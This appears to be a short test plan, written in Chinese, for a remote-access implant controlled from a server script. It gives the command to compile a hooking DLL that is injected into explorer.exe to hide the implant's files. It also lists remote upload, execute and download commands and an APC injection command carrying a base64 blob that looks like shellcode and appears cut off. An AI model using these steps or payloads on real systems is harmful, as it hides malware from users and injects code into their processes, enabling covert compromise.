# testing

## 基本指令測試

```ps1
cd ..
dir
upload PEiD.exe
start PEiD.exe
get https://download.sysinternals.com/files/ProcessExplorer.zip
dir | findstr Process
```

## 檔案隱藏測試（hide_files）

### 前置準備
1. 用 MSVC 編譯 hidden.dll：
   ```ps1
   cl /LD src/ptr/src/hidden.cpp /Fe:hidden.dll /I src/ptr/include /link MinHook.x64.lib
   ```
2. 將 hidden.dll 放在與 client.exe 相同目錄

### 測試步驟
1. 啟動 server.py
2. 啟動 client.exe
3. 在 server 輸入 `hide_files`
4. 觀察 Explorer 中的 client.exe / srv.exe / hidden.dll 是否消失
5. 用 `dir` 命令確認檔案仍然存在（只是看不見）

```ps1
# Server 端
hide_files
# 預期回傳：
# [+] File hiding activated!
#     DLL injected into explorer.exe (PID: xxxx)
#     Hidden files: client.exe, srv.exe, hidden.dll
```

### 解除隱藏
```ps1
eject_hidden
# 然後重啟 Explorer：
# taskkill /f /im explorer.exe && start explorer.exe
```

## APC 注入測試

```ps1
inject /EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhE///11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu6rF4l1BuqaVvZ3/1UiDxCg8BnwKgPvgdQW7R
```
